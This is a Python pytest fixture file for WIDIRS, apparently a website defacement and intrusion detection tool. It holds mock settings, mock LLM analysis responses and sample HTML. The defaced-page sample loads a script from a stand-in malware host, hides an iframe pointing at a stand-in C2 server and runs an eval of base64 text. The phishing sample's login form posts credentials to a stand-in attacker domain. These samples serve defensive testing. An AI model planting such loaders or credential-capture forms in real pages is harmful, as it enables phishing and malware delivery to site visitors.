"""Test configuration and fixtures for WIDIRS test suite."""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, MagicMock
from pathlib import Path

import pytest

from config import Settings


# ---------------------------------------------------------------------------
# Settings fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def mock_settings(tmp_path, monkeypatch) -> Settings:
    """Provide a test Settings instance with minimal config."""
    monkeypatch.setenv("DB_PATH", str(tmp_path / "test_widirs.db"))
    monkeypatch.setenv("SNAPSHOT_DIR", str(tmp_path / "snapshots"))
    monkeypatch.setenv("REPORT_DIR", str(tmp_path / "reports"))
    return Settings(
        google_api_key="test-gemini-key-12345",
        virustotal_api_key="test-vt-key",
        abuseipdb_api_key="test-abuse-key",
        shodan_api_key="test-shodan-key",
        misp_url="http://localhost:8080",
        misp_key="test-misp-key",
        telegram_bot_token="test-tg-token",
        telegram_chat_ids="123456789",
        smtp_host="localhost",
        smtp_port=587,
        smtp_user="test@example.com",
        smtp_pass="test-pass",
        sendgrid_api_key="test-sg-key",
        alert_email_from="alerts@example.com",
        alert_email_to="admin@example.com",
        db_path=tmp_path / "test_widirs.db",
        snapshot_dir=tmp_path / "snapshots",
        report_dir=tmp_path / "reports",
    )


@pytest.fixture
async def in_memory_db(mock_settings) -> Database:
    """Provide a Database instance connected to the test database file."""
    from database import Database
    db = Database(mock_settings.db_path)
    await db.connect()
    yield db
    await db.close()


# ---------------------------------------------------------------------------
# Gemini mock fixtures
# ---------------------------------------------------------------------------

def _create_mock_gemini_response(response_text: str) -> MagicMock:
    """Create a properly structured mock Gemini response."""
    mock_response = MagicMock()
    mock_response.text = response_text
    mock_metadata = MagicMock()
    mock_metadata.prompt_token_count = 100
    mock_metadata.candidates_token_count = 50
    mock_response.usage_metadata = mock_metadata
    return mock_response


@pytest.fixture
def mock_anthropic_client() -> AsyncMock:
    """Provide a mocked Gemini GenerativeModel with default valid response.
    
    Named mock_anthropic_client for backwards compatibility with existing tests.
    """
    client = AsyncMock()

    # Default successful response with valid JSON
    default_response_text = json.dumps({
        "threat_type": "malware_injection",
        "confidence": 0.9,
        "severity": "high",
        "severity_score": 85,
        "threat_actor_category": "criminal",
        "attack_vectors": ["drive_by_download", "watering_hole"],
        "ioc_hints": ["malware-cdn.top/loader.js", "evil-c2-server.ru/track"],
        "affected_components": ["authentication", "payment"],
        "recommended_actions": ["isolate", "restore_from_backup", "notify_users"],
        "false_positive_probability": 0.05,
        "analyst_notes": "Obfuscated JavaScript loader injected via script tag",
    })

    mock_response = _create_mock_gemini_response(default_response_text)
    client.generate_content_async = AsyncMock(return_value=mock_response)
    
    from unittest.mock import MagicMock
    client.aio = MagicMock()
    client.aio.models = MagicMock()
    client.aio.models.generate_content = AsyncMock(return_value=mock_response)

    # Keep messages.create for any legacy test code
    client.messages = MagicMock()
    client.messages.create = AsyncMock(return_value=mock_response)
    client.await_count = 0

    return client


@pytest.fixture
def make_anthropic_client():
    """Factory fixture to create Gemini-compatible clients with custom responses.
    
    Named make_anthropic_client for backwards compatibility with existing tests.
    """

    def _make_client(*responses: str) -> AsyncMock:
        client = AsyncMock()
        response_queue = list(responses)
        client.await_count = 0

        async def mock_generate(*args, **kwargs):
            client.await_count += 1
            response_text = response_queue.pop(0) if response_queue else ""
            return _create_mock_gemini_response(response_text)

        client.generate_content_async = AsyncMock(side_effect=mock_generate)
        
        from unittest.mock import MagicMock
        client.aio = MagicMock()
        client.aio.models = MagicMock()
        client.aio.models.generate_content = AsyncMock(side_effect=mock_generate)

        # Track calls through messages.create for backwards compatibility
        client.messages = MagicMock()
        client.messages.create = AsyncMock(side_effect=mock_generate)
        client.messages.create.await_count = 0

        async def mock_create(*args, **kwargs):
            client.messages.create.await_count += 1
            response_text = response_queue.pop(0) if response_queue else ""
            return _create_mock_gemini_response(response_text)

        client.messages.create = AsyncMock(side_effect=mock_create)
        return client

    return _make_client


# ---------------------------------------------------------------------------
# Path/filesystem fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def test_data_dir() -> Path:
    """Return the test data directory."""
    return Path(__file__).parent.parent / "data"


@pytest.fixture
def snapshots_dir(test_data_dir) -> Path:
    """Return the snapshots directory."""
    return test_data_dir / "snapshots"


@pytest.fixture
def reports_dir(test_data_dir) -> Path:
    """Return the reports directory."""
    return test_data_dir / "reports"


# ---------------------------------------------------------------------------
# HTML fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_clean_html() -> str:
    """Provide clean HTML for a website."""
    return """<!DOCTYPE html>
<html>
<head>
    <title>ACME Corporation</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: #333; color: white; padding: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Welcome to ACME Corporation</h1>
    </div>
    <div class="content">
        <p>This is a legitimate website for ACME Corporation.</p>
        <p>We provide excellent products and services.</p>
    </div>
</body>
</html>"""


@pytest.fixture
def sample_defaced_html() -> str:
    """Provide defaced HTML with injections."""
    return """<!DOCTYPE html>
<html>
<head>
    <title>HACKED</title>
    <meta charset="UTF-8">
    <script src="http://malware-cdn.top/loader.js"></script>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: #333; color: white; padding: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>HACKED BY GHOST SQUAD</h1>
    </div>
    <div class="content">
        <p>Your website has been defaced!</p>
        <p>Contact: ghostsquad@protonmail.com</p>
        <p>Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
        <p>IP: 45.137.21.9</p>
    </div>
    <iframe name="tracking" src="http://evil-c2-server.ru/track" style="display:none;"></iframe>
    <script>
        var x = atob('YWxlcnQoJ2luamVjdGVkJyk=');
        eval(x);
    </script>
</body>
</html>"""


@pytest.fixture
def sample_phishing_html() -> str:
    """Provide HTML with a phishing form."""
    return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>ACME Login</h1>
    <form action="http://attacker.evil-c2-server.ru/capture" method="POST">
        <label>Username:</label>
        <input type="text" name="username" required>
        <br>
        <label>Password:</label>
        <input type="password" name="password" required>
        <br>
        <button type="submit">Login</button>
    </form>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Screenshot fixtures
# ---------------------------------------------------------------------------

def _create_test_image(width: int = 320, height: int = 240, color: tuple = (255, 255, 255)) -> bytes:
    """Create a simple PNG image for testing."""
    try:
        from PIL import Image
        from io import BytesIO
        
        img = Image.new('RGB', (width, height), color)
        buf = BytesIO()
        img.save(buf, format='PNG')
        return buf.getvalue()
    except ImportError:
        # Fallback: return minimal PNG bytes if PIL not available
        # This is a 1x1 white PNG
        return (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
            b'\x00\x01\x01\x00\x05\xfb\xc5\xe4\xfe\x00\x00\x00\x00IEND\xaeB`\x82'
        )


@pytest.fixture
def clean_screenshot() -> bytes:
    """Provide PNG bytes for a clean screenshot."""
    return _create_test_image(color=(255, 255, 255))  # White


@pytest.fixture
def defaced_screenshot() -> bytes:
    """Provide PNG bytes for a defaced screenshot."""
    return _create_test_image(color=(255, 0, 0))  # Red to show it's different


@pytest.fixture
def mock_vt_response() -> dict:
    return {
        "data": {
            "attributes": {
                "last_analysis_stats": {
                    "malicious": 12,
                    "suspicious": 1,
                    "harmless": 20,
                },
                "popular_threat_names": ["malware", "botnet"],
                "categories": {"harmless": "clean"},
            }
        }
    }


@pytest.fixture
def mock_abuseipdb_response() -> dict:
    return {
        "data": {
            "abuseConfidenceScore": 100,
            "totalReports": 50,
            "isp": "Test ISP",
            "countryCode": "US",
            "usageType": "Data Center",
            "lastReportedAt": "2026-06-13T00:00:00+00:00",
        }
    }


@pytest.fixture
def mock_urlhaus_response() -> dict:
    return {
        "query_status": "is_malware",
        "threat_type": "botnet_cc",
        "url_count": 5,
        "payloads": [],
    }
